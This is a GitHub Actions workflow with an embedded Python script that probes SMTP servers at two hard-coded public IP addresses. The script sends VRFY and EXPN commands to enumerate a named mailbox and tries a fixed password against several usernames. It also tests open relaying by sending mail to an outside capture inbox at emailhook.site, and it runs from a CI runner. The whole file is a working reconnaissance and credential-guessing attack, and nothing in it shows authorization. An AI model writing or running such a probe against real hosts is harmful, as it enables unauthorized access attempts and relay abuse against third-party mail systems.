name: Relay protocol probe

on:
  workflow_dispatch:

permissions: {}

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Inspect documented relay endpoints
        shell: bash
        run: |
          python3 - <<'PY'
          import socket
          import smtplib

          hosts = ("4.148.93.130", "4.227.70.59")
          commands = (
              b"EHLO ci-runner.continental.local\r\n",
              b"HELP\r\n",
              b"VRFY winston@ztaha45hotmail.onmicrosoft.com\r\n",
              b"EXPN winston@ztaha45hotmail.onmicrosoft.com\r\n",
              b"NOOP\r\n",
              b"QUIT\r\n",
          )

          def receive(sock):
              sock.settimeout(2)
              chunks = []
              try:
                  while True:
                      chunk = sock.recv(8192)
                      if not chunk:
                          break
                      chunks.append(chunk)
                      if len(chunk) < 8192:
                          break
              except (TimeoutError, socket.timeout):
                  pass
              return b"".join(chunks).decode("utf-8", "replace").strip()

          for host in hosts:
              print(f"=== {host}:1025 ===")
              try:
                  with socket.create_connection((host, 1025), timeout=8) as sock:
                      print("BANNER", repr(receive(sock)))
                      for command in commands:
                          print("COMMAND", command.decode().strip())
                          sock.sendall(command)
                          print("RESPONSE", repr(receive(sock)))
              except Exception as error:
                  print(type(error).__name__, str(error))

          print("=== AUTH reuse probe ===")
          for username in (
              "guest",
              "guest@notify.thecontinental.local",
              "winston@ztaha45hotmail.onmicrosoft.com",
          ):
              try:
                  with smtplib.SMTP("4.148.93.130", 1025, timeout=8) as smtp:
                      smtp.ehlo("ci-runner.continental.local")
                      print("FEATURES", smtp.esmtp_features)
                      try:
                          code, message = smtp.login(username, "gold_coin")
                          print("AUTH", username, code, message.decode("utf-8", "replace"))
                      except Exception as error:
                          print("AUTH", username, type(error).__name__, str(error))
              except Exception as error:
                  print("CONNECT", username, type(error).__name__, str(error))

          print("=== Delivery probe to disposable test inbox ===")
          try:
              with smtplib.SMTP("4.148.93.130", 1025, timeout=8) as smtp:
                  refused = smtp.sendmail(
                      "probe@notify.thecontinental.local",
                      ["91d32264-d37e-4683-b50c-ebc959d41262@emailhook.site"],
                      "From: probe@notify.thecontinental.local\r\n"
                      "To: 91d32264-d37e-4683-b50c-ebc959d41262@emailhook.site\r\n"
                      "Subject: Continental relay delivery probe\r\n"
                      "\r\n"
                      "delivery-test-only\r\n",
                  )
                  print("DELIVERY", "accepted" if not refused else refused)
          except Exception as error:
              print("DELIVERY", type(error).__name__, str(error))
          PY
